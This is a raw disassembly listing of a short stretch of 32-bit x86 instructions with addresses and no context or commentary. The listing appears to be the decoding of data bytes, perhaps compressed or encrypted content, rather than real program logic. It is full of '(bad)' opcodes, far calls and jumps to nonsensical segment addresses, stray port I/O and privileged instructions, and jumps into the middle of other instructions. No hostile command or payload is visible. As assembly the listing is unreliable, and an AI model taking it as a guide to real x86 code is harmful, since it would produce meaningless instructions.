  41b6c1:	push   ds
  41b6c2:	stos   BYTE PTR es:[edi],al
  41b6c3:	cs (bad) 
  41b6c5:	sub    dh,BYTE PTR [esi]
  41b6c7:	je     0x41b6a4
  41b6c9:	stc    
  41b6ca:	jns    0x41b66a
  41b6cc:	or     DWORD PTR [ebx-0x712a046b],ecx
  41b6d2:	rcr    BYTE PTR [edi],cl
  41b6d4:	frstor es:0xd4bbf0d7
  41b6db:	test   al,0xcb
  41b6dd:	sahf   
  41b6de:	dec    edx
  41b6df:	cmp    DWORD PTR [ebx+0x53],esp
  41b6e2:	push   ds
  41b6e3:	jb     0x41b68b
  41b6e5:	jmp    0x71f75f6e
  41b6ea:	je     0x41b73d
  41b6ec:	sbb    BYTE PTR [ebp+0x68f00553],bl
  41b6f2:	lock push ss
  41b6f4:	push   ss
  41b6f5:	mov    bl,0xf4
  41b6f7:	inc    ecx
  41b6f8:	outs   dx,DWORD PTR ds:[esi]
  41b6f9:	xchg   ebp,eax
  41b6fa:	fdivr  QWORD PTR [eax-0x3b]
  41b6fd:	xor    esi,edx
  41b6ff:	push   ds
  41b700:	pop    edi
  41b701:	mov    ds:0xe9d8bc8d,al
  41b706:	dec    esp
  41b707:	imul   eax,DWORD PTR [ebp-0x1594286a],0x2b
  41b70e:	dec    ecx
  41b70f:	ret    0x4b6
  41b712:	(bad)  
  41b713:	pop    ss
  41b714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b715:	cs dec edi
  41b717:	mov    dl,0xa7
  41b719:	mov    esp,0xe46afd4e
  41b71e:	push   edi
  41b71f:	loopne 0x41b6bc
  41b721:	push   cs
  41b722:	mov    dh,0xc8
  41b724:	imul   ebx,edx,0x40
  41b727:	xor    al,0xac
  41b729:	mov    esp,DWORD PTR [ecx]
  41b72b:	fs repz leave 
  41b72e:	inc    esp
  41b72f:	xchg   ebp,ecx
  41b731:	xlat   BYTE PTR ds:[ebx]
  41b732:	mov    edi,0x3cc56c73
  41b737:	mov    ds:0x1753fb5,al
  41b73c:	ds es or al,0x8e
  41b740:	pop    eax
  41b741:	aad    0xab
  41b743:	dec    eax
  41b744:	jo     0x41b78d
  41b746:	dec    edx
  41b747:	in     al,dx
  41b748:	pop    edx
  41b749:	xlat   BYTE PTR ds:[ebx]
  41b74a:	dec    esp
  41b74b:	push   esi
  41b74c:	stos   BYTE PTR es:[edi],al
  41b74d:	in     eax,0xf7
  41b74f:	inc    ecx
  41b750:	call   0x1b08:0x4f78a67
  41b757:	pop    esi
  41b758:	imul   ebx,DWORD PTR [ecx+edx*4],0x63
  41b75c:	cmp    dl,cl
  41b75e:	pop    ebp
  41b75f:	mov    edi,0xddd503a9
  41b764:	adc    ebx,DWORD PTR [eax-0x39]
  41b767:	out    0xe6,eax
  41b769:	jns    0x41b7b2
  41b76b:	inc    ebp
  41b76c:	int3   
  41b76d:	test   bh,0xcc
  41b770:	fdiv   DWORD PTR [edx+0x66a1d29d]
  41b776:	xor    BYTE PTR [edi],0xf3
  41b779:	mov    eax,0x2677675a
  41b77e:	aaa    
  41b77f:	mov    esi,0x9f5fa780
  41b784:	(bad)  
  41b785:	int    0xd0
  41b787:	std    
  41b788:	mov    ah,0x99
  41b78a:	jmp    0x41b76b
  41b78c:	lea    ecx,[edi]
  41b78e:	dec    ecx
  41b78f:	loope  0x41b78e
  41b791:	pop    eax
  41b792:	mov    BYTE PTR [edi+0x57],cl
  41b795:	fist   WORD PTR [ebx-0x19ba1e97]
  41b79b:	cmp    al,0xf8
  41b79d:	sahf   
  41b79e:	adc    DWORD PTR [ebx+0x6a],ebx
  41b7a1:	fwait
  41b7a2:	xor    al,0x44
  41b7a4:	jg     0x41b7a2
  41b7a6:	es lahf 
  41b7a8:	inc    ebp
  41b7a9:	add    eax,DWORD PTR [ebx-0x39df97fd]
  41b7af:	add    eax,0xbdcbf762
  41b7b4:	xchg   esi,eax
  41b7b5:	mov    esi,0xbe607b35
  41b7ba:	std    
  41b7bb:	adc    al,BYTE PTR [ecx-0xe886a71]
  41b7c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7c2:	jnp    0x41b767
  41b7c4:	mov    ebp,DWORD PTR [eax+0xc]
  41b7c7:	cld    
  41b7c8:	(bad)  
  41b7c9:	adc    al,0xfc
  41b7cb:	xchg   edi,eax
  41b7cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7cd:	cmp    ecx,edi
  41b7cf:	or     eax,DWORD PTR [ebx+edi*4+0x1d]
  41b7d3:	ins    DWORD PTR es:[edi],dx
  41b7d4:	hlt    
  41b7d5:	sbb    edi,DWORD PTR [eax+eiz*2]
  41b7d8:	add    eax,0x9ff52dfa
  41b7dd:	mov    al,ds:0x3cc93b7a
  41b7e2:	shl    BYTE PTR [edi],1
  41b7e4:	pop    eax
  41b7e5:	loopne 0x41b7d6
  41b7e7:	mov    esi,0x809796b6
  41b7ec:	push   0xfffffff0
  41b7ee:	lods   eax,DWORD PTR ds:[esi]
  41b7ef:	sbb    eax,DWORD PTR [ebx+0x1e]
  41b7f2:	mov    ds:0x875c790f,al
  41b7f7:	jmp    0x41b77a
  41b7f9:	shl    BYTE PTR ds:0x7915db78,0x8
  41b800:	outs   dx,BYTE PTR ds:[esi]
  41b801:	fild   DWORD PTR [ebp-0x4a]
  41b804:	rdpmc  
  41b806:	push   ds
  41b807:	cmp    al,0x89
  41b809:	cli    
  41b80a:	mov    ah,bl
  41b80c:	pop    ecx
  41b80d:	std    
  41b80e:	std    
  41b80f:	xchg   ebx,eax
  41b810:	jne    0x41b87e
  41b812:	or     eax,0xa878fe87
  41b817:	ins    DWORD PTR es:[edi],dx
  41b818:	push   edx
  41b819:	mov    ds,WORD PTR [eax-0x6b]
  41b81c:	pop    ebp
  41b81e:	inc    eax
  41b81f:	(bad)  
  41b821:	fadd   QWORD PTR [edx]
  41b823:	xchg   edi,eax
  41b824:	test   BYTE PTR [eax+0x504b71fc],0xd0
  41b82b:	mov    esp,ds
  41b82d:	push   ebp
  41b82e:	les    eax,FWORD PTR [ecx+edi*8]
  41b831:	aas    
  41b832:	cmp    BYTE PTR [edi+0x6f],ch
  41b835:	adc    esp,DWORD PTR [edx+0x1efedeaa]
  41b83b:	lods   al,BYTE PTR ds:[esi]
  41b83c:	(bad)  
  41b83d:	jnp    0x41b7cf
  41b83f:	jmp    0x41b81b
  41b841:	mov    dl,0x56
  41b843:	mov    al,ds:0x2fc49deb
  41b848:	(bad)  
  41b84a:	push   edx
  41b84b:	arpl   WORD PTR [ecx+edx*4],dx
  41b84e:	mov    ebp,0x12db7df7
  41b853:	imul   ecx,DWORD PTR [ebx-0x52],0x1a
  41b857:	call   0xf023:0x553d96c7
  41b85e:	sbb    cl,bh
  41b860:	out    dx,eax
  41b861:	ds repz int3 
  41b864:	gs leave 
  41b866:	or     eax,0x58644007
  41b86b:	aaa    
  41b86c:	dec    esi
  41b86d:	sub    ch,BYTE PTR [esi-0x46]
  41b870:	mov    ss,WORD PTR [esi-0x7a]
  41b873:	retf   
  41b874:	call   FWORD PTR [ecx+0x29]
  41b877:	arpl   dx,ax
  41b879:	jbe    0x41b876
  41b87b:	sub    DWORD PTR [eax],ebp
  41b87d:	mov    al,0x81
  41b87f:	jle    0x41b887
  41b881:	jae    0x41b870
  41b883:	or     bh,bl
  41b885:	ds dec eax
  41b887:	mov    DWORD PTR [ebx+eax*2-0x1dfd4840],eax
  41b88e:	mov    ecx,0x6cdfad0b
  41b893:	aaa    
  41b894:	and    BYTE PTR [ebp+0x2148d853],dh
  41b89a:	in     al,0xc3
  41b89c:	ja     0x41b88e
  41b89e:	(bad)  
  41b89f:	loop   0x41b906
  41b8a1:	rcr    BYTE PTR [ebx-0x66],1
  41b8a4:	mov    esi,0xf80b89e8
  41b8a9:	sub    esi,esi
  41b8ab:	lahf   
  41b8ac:	xor    eax,0x31113761
  41b8b1:	test   eax,0x6b5cda1e
  41b8b6:	pop    ds
  41b8b7:	and    al,0x2d
  41b8b9:	fcom   DWORD PTR [eax+0x13909c6]
  41b8bf:	scas   eax,DWORD PTR es:[edi]
  41b8c0:	jmp    eax
  41b8c2:	mov    ds:0x11ce151a,al
  41b8c7:	stos   DWORD PTR es:[edi],eax
  41b8c8:	sub    BYTE PTR [ecx+0x3f],0x86
  41b8cc:	add    ebx,DWORD PTR [edi+eax*2-0x140bbb12]
  41b8d3:	data16 jmp 0x41b8fe
  41b8d6:	cmp    bh,cl
  41b8d8:	fistp  DWORD PTR [ecx-0x3d]
  41b8db:	and    al,0x2c
  41b8dd:	xchg   ecx,eax
  41b8de:	jns    0x41b94b
  41b8e0:	push   ds
  41b8e1:	jo     0x41b8dd
  41b8e3:	daa    
  41b8e4:	mov    edi,0xbdff9a36
  41b8e9:	pop    eax
  41b8ea:	pop    es
  41b8eb:	xchg   esp,eax
  41b8ec:	xchg   DWORD PTR [ecx-0x250ba09c],eax
  41b8f2:	(bad)  
  41b8f3:	push   esp
  41b8f4:	ret    
  41b8f5:	pop    esp
  41b8f6:	add    eax,DWORD PTR ds:[ebx]
  41b8f9:	inc    ebx
  41b8fa:	into   
  41b8fb:	sbb    esi,edi
  41b8fd:	out    dx,eax
  41b8fe:	shl    BYTE PTR [ebp+0x30],1
  41b901:	les    edi,FWORD PTR [eax-0x4d]
  41b904:	mov    bh,0xe2
  41b906:	dec    ebx
  41b907:	cwde   
  41b908:	jmp    0x7931:0x398d4929
  41b90f:	movups XMMWORD PTR [ebx+0x85c5088],xmm5
  41b916:	fsubr  st(1),st
  41b918:	sar    DWORD PTR [ebx],cl
  41b91a:	jecxz  0x41b939
  41b91c:	popa   
  41b91d:	hlt    
  41b91e:	xchg   esi,eax
  41b91f:	aad    0x2b
  41b921:	add    esp,ebx
  41b923:	sahf   
  41b924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b925:	xor    bh,BYTE PTR [ebp+0x4ab03357]
  41b92b:	call   0x1ba36444
  41b930:	sub    ecx,DWORD PTR ss:[eax-0x2b4cc4c5]
  41b937:	add    al,0x29
  41b939:	xor    eax,0x71323cbe
  41b93e:	xchg   ebx,eax
  41b93f:	sub    BYTE PTR [edx-0x26a53709],ch
  41b945:	and    al,0x14
  41b947:	jg     0x41b8f8
  41b949:	cmp    eax,0x8832ab78
  41b94e:	dec    edi
  41b94f:	outs   dx,DWORD PTR ds:[esi]
  41b950:	sbb    edx,DWORD PTR [ecx-0x36543d8]
  41b956:	sbb    bl,BYTE PTR es:[edx+0x2b]
  41b95a:	mov    fs,edx
  41b95c:	stos   BYTE PTR es:[edi],al
  41b95d:	outs   dx,BYTE PTR ds:[esi]
  41b95e:	mov    al,0x9d
  41b960:	js     0x41b943
  41b962:	jp     0x41b929
  41b964:	out    dx,eax
  41b965:	aaa    
  41b966:	push   eax
  41b967:	cwde   
  41b968:	shl    BYTE PTR ds:0x2b36dfde,0xe6
  41b96f:	ins    DWORD PTR es:[edi],dx
  41b970:	(bad)  
  41b971:	push   cs
  41b972:	mov    DWORD PTR [eax-0x54b17bfa],esi
  41b978:	sbb    eax,0x65a26cbd
  41b97d:	mov    cl,0x38
  41b97f:	inc    esi
  41b980:	lea    esp,ds:0x397a8dbc
  41b986:	pop    edi
  41b987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b988:	add    BYTE PTR [eax+0x73a3215e],0xd3
  41b98f:	mov    ch,0x9c
  41b991:	or     BYTE PTR [eax],0xfd
  41b994:	cmp    ch,BYTE PTR [ecx+0x11]
  41b997:	in     al,0xb4
  41b999:	jnp    0xfffb5ab5
  41b99f:	cmp    DWORD PTR [eax+edx*4+0x6e2d4b42],0x76076cf6
  41b9aa:	xor    bh,BYTE PTR [eax+0x45c8726b]
  41b9b0:	test   BYTE PTR [esi],cl
  41b9b2:	sub    dh,BYTE PTR [ebx-0x62]
  41b9b5:	pop    edi
  41b9b6:	push   ebx
  41b9b7:	std    
  41b9b8:	lea    esi,[eax-0x48]
  41b9bb:	or     BYTE PTR ds:0xe6e8787f,al
  41b9c1:	or     bl,bh
  41b9c3:	jmp    0x5e2a:0x9278e1e1
  41b9ca:	or     eax,0x8cae339d
  41b9cf:	ja     0x41b9f7
  41b9d1:	out    0x30,al
  41b9d3:	(bad)  
  41b9d4:	push   ecx
  41b9d5:	xor    BYTE PTR [ebp-0x252cf32d],cl
  41b9db:	std    
  41b9dc:	cmp    al,0xeb
  41b9de:	xchg   esi,ebp
  41b9e0:	pop    ecx
  41b9e1:	cli    
  41b9e2:	call   0x7aa8:0xa4b3fdf4
  41b9e9:	ins    BYTE PTR es:[edi],dx
  41b9ea:	(bad)  
  41b9eb:	(bad)  [ecx-0x28]
  41b9ee:	mov    esi,DWORD PTR [eax]
  41b9f0:	dec    edi
  41b9f1:	cmp    DWORD PTR [esi-0x39867bab],edx
  41b9f7:	es add eax,0x704e65fa
  41b9fd:	xrelease xchg DWORD PTR [edx+0x26],eax
  41ba01:	fsubr  QWORD PTR [esi+0x40]
  41ba04:	cmp    edi,DWORD PTR [edx]
  41ba06:	call   0x81d4:0xb01e7e1c
  41ba0d:	data16 mov ds:0xe28f91dc,al
  41ba13:	jns    0x41b9ac
  41ba15:	adc    BYTE PTR [ebx],dh
  41ba17:	ret    0xcf09
  41ba1a:	mov    ebx,0x16038be9
  41ba1f:	mov    esi,0x5b95c599
  41ba24:	stc    
  41ba25:	imul   esi,DWORD PTR [ecx+0x18cf22ee],0xb6fbaa9b
  41ba2f:	mov    eax,0x4e4fca19
  41ba34:	jg     0x41baaf
  41ba36:	mov    edi,0xb7353497
  41ba3b:	ss in  eax,0x68
  41ba3e:	dec    ebp
  41ba3f:	test   eax,0x876220fc
  41ba44:	ss jmp 0x8acc8028
  41ba4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba4b:	xor    eax,0xe304dd1c
  41ba50:	pop    ebp
  41ba51:	pop    eax
  41ba52:	xor    eax,DWORD PTR [edi-0x15]
  41ba55:	sub    eax,0xbc33c344
  41ba5a:	cmp    DWORD PTR [ebx+0x71],ebx
  41ba5d:	adc    ch,BYTE PTR [ebx-0x1b]
  41ba60:	rcr    edx,1
  41ba62:	pop    ds
  41ba63:	dec    DWORD PTR [ecx+0x1679d967]
  41ba69:	xchg   edi,ecx
  41ba6b:	hlt    
  41ba6c:	clc    
  41ba6d:	popf   
  41ba6e:	dec    esi
  41ba6f:	cmc    
  41ba70:	dec    esi
  41ba71:	mov    dh,0x4f
  41ba73:	daa    
  41ba74:	das    
  41ba75:	lods   al,BYTE PTR ds:[esi]
  41ba76:	add    al,0xe
  41ba78:	(bad)  
  41ba79:	dec    ebx
  41ba7a:	cdq    
  41ba7b:	add    eax,0x609019a9
  41ba80:	or     al,0xf9
  41ba82:	(bad)  
  41ba83:	xchg   ebx,eax
  41ba84:	adc    cl,bh
  41ba86:	ficomp WORD PTR [ecx]
  41ba88:	mov    BYTE PTR [ebp-0x262f4ddd],al
  41ba8e:	pop    eax
  41ba8f:	or     edx,DWORD PTR [ecx]
  41ba91:	inc    eax
  41ba92:	push   ebp
  41ba93:	jge    0x41ba7a
  41ba95:	imul   edx,DWORD PTR [edi-0x5e],0xe339bba6
  41ba9c:	mov    ebx,0x1447618e
  41baa1:	test   al,0x23
  41baa3:	jne    0x41bb14
  41baa5:	xor    bh,BYTE PTR [ebx+0x676d2e53]
  41baab:	mov    bh,BYTE PTR [edx+edi*4+0x1d99961]
  41bab2:	pushf  
  41bab3:	mov    bl,0xb4
  41bab5:	dec    esp
  41bab6:	test   BYTE PTR [esi+esi*2+0x5],ah
  41baba:	inc    edx
  41babb:	jge    0x41bb14
  41babd:	jp     0x41baa0
  41babf:	pop    ecx
  41bac0:	inc    esi
  41bac1:	push   ecx
  41bac2:	lock daa 
  41bac4:	and    al,0x18
  41bac6:	jnp    0x41bb1a
  41bac8:	add    al,0x5a
  41baca:	in     eax,0xfe
  41bacc:	jmp    0xe248:0xc573f4e4
  41bad3:	test   al,0xe5
  41bad5:	add    eax,0x8853042f
  41bada:	les    eax,FWORD PTR [ebx]
  41badc:	inc    edi
  41badd:	xor    esi,DWORD PTR [esp+edx*1-0x5a]
  41bae1:	mov    al,0x83
  41bae3:	mov    es:0x7f6bbb02,al
  41bae9:	and    DWORD PTR [ebp-0x27],esi
  41baec:	pushf  
  41baed:	xchg   bl,ch
  41baef:	pop    eax
  41baf0:	popf   
  41baf1:	adc    DWORD PTR [ecx+0x1f],esi
  41baf4:	pop    esp
  41baf5:	mov    al,0x1d
  41baf7:	inc    eax
  41baf8:	cs inc ebp
  41bafa:	fdivr  QWORD PTR [esp+ebx*8+0x72466bb7]
  41bb01:	sub    edx,ecx
  41bb03:	cmp    esi,ecx
  41bb05:	fcomp  QWORD PTR [ecx]
  41bb07:	das    
  41bb08:	sti    
  41bb09:	pop    edx
  41bb0a:	push   0x1e
  41bb0c:	test   DWORD PTR [edi-0xdcf9dbd],ebp
  41bb12:	jne    0x41bb8e
  41bb14:	push   0x5f1600c3
  41bb19:	in     al,dx
  41bb1a:	xchg   ebp,eax
  41bb1b:	cmc    
  41bb1c:	cwde   
  41bb1d:	xlat   BYTE PTR ds:[ebx]
  41bb1e:	popf   
  41bb1f:	add    DWORD PTR [ebp-0x7036934b],esi
  41bb25:	pop    eax
  41bb26:	inc    edi
  41bb27:	neg    bl
  41bb29:	pushf  
  41bb2a:	hlt    
  41bb2b:	push   edi
  41bb2c:	dec    ebx
  41bb2d:	mov    cl,0x2
  41bb2f:	imul   edx,DWORD PTR [esi+0x2c],0x86ceb1fa
  41bb36:	nop
  41bb37:	ret    
  41bb38:	loop   0x41bace
  41bb3a:	dec    ebp
  41bb3b:	add    dl,cl
  41bb3d:	in     al,0x53
  41bb3f:	add    cl,BYTE PTR [edi+eiz*4]
  41bb42:	pop    ebp
  41bb43:	aaa    
  41bb44:	aad    0xf3
  41bb46:	jmp    0x41bb46
  41bb48:	mov    esp,0x5a302f76
  41bb4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb4e:	cmc    
  41bb4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb50:	pop    eax
  41bb51:	popa   
  41bb52:	sbb    BYTE PTR [eax+0x2c352acc],ah
  41bb58:	fidiv  DWORD PTR [edx+0x1f]
  41bb5b:	and    dl,BYTE PTR [eax-0x5719352c]
  41bb61:	xchg   dl,dh
  41bb63:	jbe    0x41bb7c
  41bb65:	mov    cs,WORD PTR [ecx]
  41bb67:	or     BYTE PTR [ecx],0x3a
  41bb6a:	xchg   dh,ch
  41bb6c:	mov    edi,0x418e1614
  41bb71:	fs inc eax
  41bb73:	loopne 0x41bb09
  41bb75:	(bad)  
  41bb76:	arpl   WORD PTR [ebx+0x3f7b13d3],bp
  41bb7c:	mov    cl,0xf8
  41bb7e:	adc    al,0xca
  41bb80:	lods   al,BYTE PTR ds:[esi]
  41bb81:	sbb    BYTE PTR [edi+0x66c726ff],0xed
  41bb88:	imul   BYTE PTR [edi+0x3d]
  41bb8b:	sbb    al,0x2b
  41bb8d:	mov    es,WORD PTR [edi]
  41bb8f:	and    BYTE PTR [edi+ecx*4+0x26f7385f],cl
  41bb96:	lea    ebx,[eax+0x13]
  41bb99:	add    eax,0x1965c1b0
  41bb9e:	add    ecx,DWORD PTR [ebp-0x76]
  41bba1:	into   
  41bba2:	cld    
  41bba3:	sahf   
  41bba4:	or     DWORD PTR [ebp+0x6e45b31c],ecx
  41bbaa:	stc    
  41bbab:	scas   al,BYTE PTR es:[edi]
  41bbac:	pop    edx
  41bbad:	and    al,BYTE PTR [ecx-0x6c7374dd]
  41bbb3:	sahf   
  41bbb4:	or     al,0xdb
  41bbb6:	sbb    bh,BYTE PTR ds:0x6c73270b
  41bbbc:	daa    
  41bbbd:	fs mov eax,cs:0x7daedb3c
  41bbc4:	pop    ecx
  41bbc5:	nop
  41bbc6:	ins    BYTE PTR es:[edi],dx
  41bbc7:	adc    bh,BYTE PTR [ecx+0x195f5057]
  41bbcd:	and    al,0x67
  41bbcf:	sub    ebp,DWORD PTR [esi]
  41bbd1:	inc    edx
  41bbd2:	sub    DWORD PTR [ecx+eax*2-0x4a],0xb9adef2d
  41bbda:	push   eax
  41bbdb:	cwde   
  41bbdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbdd:	mov    ds:0x473b5b1b,al
  41bbe2:	xchg   ecx,eax
  41bbe3:	and    BYTE PTR [ecx-0x4c],bl
  41bbe6:	inc    ebx
  41bbe7:	or     bh,BYTE PTR [esi+0x57]
  41bbea:	mov    dh,0xb1
  41bbec:	adc    DWORD PTR [eax-0x78e0c41d],0xc34d1ba3
  41bbf6:	int    0x1f
  41bbf8:	rol    BYTE PTR [ebx],0xb1
  41bbfb:	stos   DWORD PTR es:[edi],eax
  41bbfc:	repnz mov bl,0x9c
  41bbff:	imul   esi,DWORD PTR [edi+0x15],0x6dd5e51c
  41bc06:	out    0xe0,al
  41bc08:	sahf   
  41bc09:	addr16 dec ebx
  41bc0b:	xor    al,0x8
  41bc0d:	sar    BYTE PTR [eax-0x1f12f7f4],cl
  41bc13:	ins    BYTE PTR es:[edi],dx
  41bc14:	sbb    dh,BYTE PTR [edi-0x73bd9fd4]
  41bc1a:	adc    DWORD PTR [ebp+0x6f9a927d],eax
  41bc20:	(bad)  
  41bc21:	hlt    
  41bc22:	push   cs
  41bc23:	xchg   esi,eax
  41bc24:	xor    DWORD PTR [ecx+esi*4+0x28],eax
  41bc28:	xchg   ebx,eax
  41bc29:	dec    ebp
  41bc2a:	push   eax
  41bc2b:	fs jmp 0x24a1ff46
  41bc31:	popf   
  41bc32:	retf   
  41bc33:	call   0x9746:0x805993b1
  41bc3a:	pop    esp
  41bc3b:	daa    
  41bc3c:	xor    al,0x87
  41bc3e:	shr    BYTE PTR [edx+0x31289ffb],cl
  41bc44:	jbe    0x41bbda
  41bc46:	or     dh,BYTE PTR [esi-0x24a8cac8]
  41bc4c:	sbb    ebx,DWORD PTR [esi]
  41bc4e:	arpl   dx,dx
  41bc50:	retf   0xe377
  41bc53:	in     al,0x96
  41bc55:	adc    bl,cl
  41bc57:	pop    esi
  41bc58:	pop    ebp
  41bc59:	js     0x41bbfb
  41bc5b:	pop    ds
  41bc5c:	jmp    0x41bcd4
  41bc5e:	mov    esp,0xb3508507
  41bc63:	ds mov bh,0xf9
  41bc66:	test   BYTE PTR [edx],ah
  41bc68:	jmp    0xf8894ddc
  41bc6d:	push   ecx
  41bc6e:	loop   0x41bc98
  41bc70:	outs   dx,BYTE PTR ds:[esi]
  41bc71:	jns    0x41bcb9
  41bc73:	mov    cl,0xe
  41bc75:	cwde   
  41bc76:	scas   eax,DWORD PTR es:[edi]
  41bc77:	pop    ss
  41bc78:	sub    BYTE PTR [edx+0x7e],bh
  41bc7b:	pusha  
  41bc7c:	mov    ds:0xda4fef4d,al
  41bc81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc82:	or     ch,ah
  41bc84:	dec    edx
  41bc85:	clc    
  41bc86:	inc    eax
  41bc87:	and    BYTE PTR [eax-0x23d61936],bh
  41bc8d:	into   
  41bc8e:	xchg   DWORD PTR [esi+0x598da7c],eax
  41bc94:	pop    ebx
  41bc95:	mov    bh,0x72
  41bc97:	adc    DWORD PTR [edx],esp
  41bc99:	dec    esi
  41bc9a:	add    bh,BYTE PTR [edi+edx*2]
  41bc9d:	gs dec esi
  41bc9f:	aaa    
  41bca0:	xchg   DWORD PTR [esi],ebx
  41bca2:	jmp    0x19579013
  41bca7:	sbb    esp,ebp
  41bca9:	xchg   ch,dl
  41bcab:	ins    BYTE PTR es:[edi],dx
  41bcac:	or     ebp,edi
  41bcae:	dec    eax
  41bcaf:	dec    edx
  41bcb0:	jb     0x41bcd0
  41bcb2:	adc    BYTE PTR [ebp-0x14],0xb4
  41bcb6:	mov    ebp,ebx
  41bcb8:	xor    dl,BYTE PTR [esi+0x7e65f0d0]
  41bcbe:	retf   
  41bcbf:	jl     0x41bc70
  41bcc1:	ror    esp,cl
  41bcc3:	add    BYTE PTR [ebp-0x4da061a5],dh
  41bcc9:	pop    edx
  41bcca:	popf   
  41bccb:	jbe    0x41bc7f
  41bccd:	sub    DWORD PTR ds:0xdd3c175c,edi
  41bcd3:	adc    BYTE PTR ds:0x954f19fb,dh
  41bcd9:	pusha  
  41bcda:	sbb    BYTE PTR [esi-0x15],bl
  41bcdd:	lea    ebx,[esi+0x6c]
  41bce0:	push   edi
  41bce1:	sbb    BYTE PTR [edi-0x7b7555ad],dl
  41bce7:	push   eax
  41bce8:	pop    edx
  41bce9:	xor    dl,BYTE PTR [eax+0x6f]
  41bcec:	sbb    DWORD PTR [ecx+0x1d],0x59271845
  41bcf3:	out    0x3a,al
  41bcf5:	out    dx,al
  41bcf6:	(bad)  
  41bcf8:	mov    esp,0x940a1c0e
  41bcfd:	inc    esi
  41bcfe:	mov    bh,0xe8
  41bd00:	(bad)  
  41bd01:	sub    BYTE PTR [ebx],ch
  41bd03:	out    dx,eax
  41bd04:	rcr    DWORD PTR [ebx+0x3b],cl
  41bd07:	in     al,0xc7
  41bd09:	fld    DWORD PTR [edx-0x445364fb]
  41bd0f:	ins    DWORD PTR es:[edi],dx
  41bd10:	test   BYTE PTR [esi-0x3dfcd595],dl
  41bd16:	lock pop ds
  41bd18:	stos   DWORD PTR es:[edi],eax
  41bd19:	pop    esp
  41bd1a:	lods   al,BYTE PTR ds:[esi]
  41bd1b:	call   0xeb29:0x4e13f939
  41bd22:	push   0xffffff8b
  41bd24:	cmp    BYTE PTR [edx+0xad7fdd8],ch
  41bd2a:	dec    ebp
  41bd2b:	aaa    
  41bd2c:	dec    edx
  41bd2d:	sbb    esi,DWORD PTR [edi-0x7acd2835]
  41bd33:	in     al,0x4
  41bd35:	mov    esi,0x12274deb
  41bd3a:	mov    al,ds:0x7de18df4
  41bd3f:	mov    bl,0x3a
  41bd41:	mov    edi,0x77159eed
  41bd46:	dec    ecx
  41bd47:	push   esp
  41bd48:	xor    esi,DWORD PTR ds:0x81d17e85
  41bd4e:	push   ds
  41bd4f:	adc    cl,BYTE PTR [ebx]
  41bd51:	sbb    al,0xa9
  41bd53:	fnstsw WORD PTR [ecx]
  41bd55:	test   BYTE PTR [ebp+0x3c464f05],0x22
  41bd5c:	je     0x41bd54
  41bd5e:	push   edx
  41bd5f:	push   ebx
  41bd60:	mov    al,ds:0x7fec4fcc
  41bd65:	sub    dl,BYTE PTR [ecx]
  41bd67:	pop    eax
  41bd68:	data16 add al,0x71
  41bd6b:	or     eax,0x23adbea3
  41bd70:	std    
  41bd71:	and    esp,DWORD PTR [edx]
  41bd73:	mov    ds:0xc07cd01,al
  41bd78:	das    
  41bd79:	xor    BYTE PTR [ecx],0x7b
  41bd7c:	cs sub eax,0x35b6247
  41bd82:	add    edx,DWORD PTR [esi+0x75]
  41bd85:	xor    DWORD PTR [ebp-0x47],ebx
  41bd88:	(bad)  
  41bd89:	or     eax,0xf8681395
  41bd8e:	pop    ds
  41bd8f:	and    ch,BYTE PTR [edi-0x84d4ee2]
  41bd95:	shl    DWORD PTR [eax+0x28b73db2],0x89
  41bd9c:	xchg   BYTE PTR [edx-0x7],dl
  41bd9f:	fidivr WORD PTR [esp+ebp*4+0x11f3c70e]
  41bda6:	pop    ebp
  41bda7:	add    BYTE PTR ds:[eax-0x433aa229],al
  41bdae:	or     al,0x7d
  41bdb0:	adc    dl,al
  41bdb2:	xchg   edx,eax
  41bdb3:	sbb    BYTE PTR [eax+0x68260c12],dh
  41bdb9:	xor    ah,dl
  41bdbb:	push   edi
  41bdbc:	(bad)  
  41bdbd:	cmp    ecx,DWORD PTR [ebp-0x50]
  41bdc0:	inc    edi
  41bdc1:	in     al,dx
  41bdc2:	cmp    al,0x20
  41bdc4:	lahf   
  41bdc5:	(bad)  
  41bdc7:	loop   0x41be0e
  41bdc9:	mov    al,ds:0x8b379144
  41bdce:	sbb    edx,DWORD PTR [esi+0x3c12e886]
  41bdd4:	cmp    al,0xc1
  41bdd6:	dec    DWORD PTR [edi]
  41bdd8:	mov    al,ds:0x2d73cf04
  41bddd:	mov    esp,0x6329
  41bde2:	add    BYTE PTR [eax],al
  41bde4:	add    BYTE PTR [eax],al
  41bde6:	arpl   WORD PTR [esi+0x63ff63be],bx
  41bdec:	call   FWORD PTR [esi-0x676d79db]
  41bdf2:	mov    bl,0xa8
  41bdf4:	mov    DWORD PTR [edi*2+0x220001b7],edx
  41bdfb:	pop    es
  41bdfc:	add    BYTE PTR [eax],al
  41bdfe:	call   0xd977fc0
  41be03:	cmp    BYTE PTR [edi+0x76],dl
  41be06:	xchg   ecx,eax
  41be07:	mov    ch,0x39
  41be09:	(bad)  
  41be0b:	fild   WORD PTR [esi]
  41be0d:	pop    ebp
  41be0e:	out    0x25,eax
  41be10:	sahf   
  41be11:	cmp    eax,0x77c16728
  41be16:	cli    
  41be17:	jmp    0x3d7ae8c4
  41be1c:	mov    bl,0xb
  41be1e:	or     DWORD PTR [edi-0x2a],ecx
  41be21:	and    ch,BYTE PTR [ebp+ebx*4+0x11]
  41be25:	sbb    DWORD PTR ds:0x98cb80c9,edi
  41be2b:	arpl   WORD PTR [eax+ecx*2],sp
  41be2e:	sti    
  41be2f:	lahf   
  41be30:	mov    DWORD PTR [esi+ebp*2-0x60],ebp
  41be34:	mov    edi,0xc4ce4b2d
  41be39:	pop    ecx
  41be3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be3b:	call   0x4efd:0xfa96339a
  41be42:	rcr    ah,0xba
  41be45:	cld    
  41be46:	dec    ebp
  41be47:	sbb    BYTE PTR [esi-0x3b],bl
  41be4a:	mov    ch,0x58
